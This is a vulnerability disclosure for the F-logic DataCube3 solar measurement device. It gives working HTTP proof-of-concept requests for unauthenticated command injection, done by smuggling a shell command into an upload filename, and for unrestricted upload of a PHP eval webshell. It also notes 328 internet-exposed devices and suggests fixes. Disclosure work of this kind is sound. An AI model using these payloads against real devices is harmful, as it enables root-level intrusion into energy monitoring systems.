> Author: Ph0Jav7
> Keywords：PHP, DataCube3, Shell Code Injection

# Product Description

The DataCube3 from [F-logic](https://www.f-logic.jp/) is a compact terminal measurement system for photovoltaic power generation systems.

![product](https://github.com/Yang-Nankai/Vulnerabilities/blob/main/Pasted%20image%2020240503010448.png)

# Affected Products

All F-logic DataCube3 measurement system version 1.0.

![product-version](https://github.com/Yang-Nankai/Vulnerabilities/blob/main/Pasted%20image%2020240503010620.png)

# Vulnerability Summary

## Shell Code Injection

DataCube3 is affected by a command execution injection vulnerability, where file upload allows unauthenticated malicious actors to perform command injection attacks by manipulating the file name. Successful exploitation of the vulnerability could allow an attacker to upload a file with a PHP webshell leading to an RCE (Remote Code Execution) vulnerability. This issue affects all DataCube3 appliances version 1.0.

## Unrestricted File Upload

DataCube3 is affected by unrestricted file uploads that allow unauthenticated malicious actors to upload dangerous types of files by manipulating file extensions. Successful exploitation could allow an attacker to upload files that expose a `PHP Webshell` leading to an `RCE(Remote Code Execution)` vulnerability. This issue affects all DataCube3 appliances version 1.0.

# Reproduction Steps

## Shell Code Injection

There is a command injection vulnerability in `/admin/transceiver_schedule.php` that does not require authentication. The uploaded file name is not filtered and the file name is concatenated during execution, so command injection can be performed through this vulnerability. In the example, we will show how to exploit the command injection in the file name and write a minimal PHP WebShell.

![burpsuite](https://github.com/Yang-Nankai/Vulnerabilities/blob/main/Pasted%20image%2020240503012751.png)

Then visit `/admin/flag.php` and you will find that the webshell has been written successfully.

![shell](https://github.com/Yang-Nankai/Vulnerabilities/blob/main/Pasted%20image%2020240503012943.png)

## Unrestricted File Upload

There is a file upload point at `/admin/transceiver_schedule.php` to upload a CSV file. This function does not strictly filter the file, allowing us to upload any file on the device. In the example, it will show how to upload a minimal `PHP Webshell` named `flag.php`, which contains PHP code and allows us to send Linux commands to the server.

![upload](https://github.com/Yang-Nankai/Vulnerabilities/blob/main/Pasted%20image%2020240503105430.png)

Now you can access the page `/admin/data/flag.php` and execute the PHP script, which will then send linux commands directly to the server with `root` privileges.

![upload-shell](https://github.com/Yang-Nankai/Vulnerabilities/blob/main/Pasted%20image%2020240503105626.png)

# POC

## Shell Code Injection

```http
POST /admin/transceiver_schedule.php HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------37436279464137825937312543375
Content-Length: 531
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------37436279464137825937312543375
Content-Disposition: form-data; name="upload_file"; filename="ebara_new.csv; echo '<?php @eval($_POST[x])?>' > flag.php;"
Content-Type: application/octet-stream

test

-----------------------------37436279464137825937312543375
Content-Disposition: form-data; name="usb_schedule"

%e5%9b%ba%e5%ae%9a%e3%82%b9%e3%82%b1%e3%82%b8%e3%83%a5%e3%83%bc%e3%83%ab%e3%82%a4%e3%83%b3%e3%83%9d%e3%83%bc%e3%83%88
-----------------------------37436279464137825937312543375--
```
## Unrestricted File Upload

```http
POST /admin/transceiver_schedule.php HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------37436279464137825937312543375
Content-Length: 422
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------37436279464137825937312543375
Content-Disposition: form-data; name="upload_file"; filename="flag.php"
Content-Type: application/vnd.ms-excel

<?php @eval($_POST[x]);?>

-----------------------------37436279464137825937312543375
Content-Disposition: form-data; name="usb_schedule"

%e5%9b%ba%e5%ae%9a%e3%82%b9%e3%82%b1%e3%82%b8%e3%83%a5%e3%83%bc%e3%83%ab%e3%82%a4%e3%83%b3%e3%83%9d%e3%83%bc%e3%83%88
-----------------------------37436279464137825937312543375--

```

# Recommendation Fixes / Remediation

## Shell Code Injection

Escape command injection splicing and ensure that all requests sent to the backend are authenticated.

## Unrestricted File Upload

Make sure to set very strict file storage location, better file name sanitization logic, file content validation rules.

# Vulnerable Devices Found

As of 2 May 2024, there were 328 F-logic DataCube3 devices exposed to the internet and were affected by the vulnerabilities discovered.

![fofa](https://github.com/Yang-Nankai/Vulnerabilities/blob/main/Pasted%20image%2020240503013439.png)

# References

[https://www.f-logic.jp](https://www.f-logic.jp/)

[https://www.f-logic.jp/pdf/support/manual_product/manual_product_datacube3_ver1.0_sc.pdf](https://www.f-logic.jp/pdf/support/manual_product/manual_product_datacube3_ver1.0_sc.pdf)
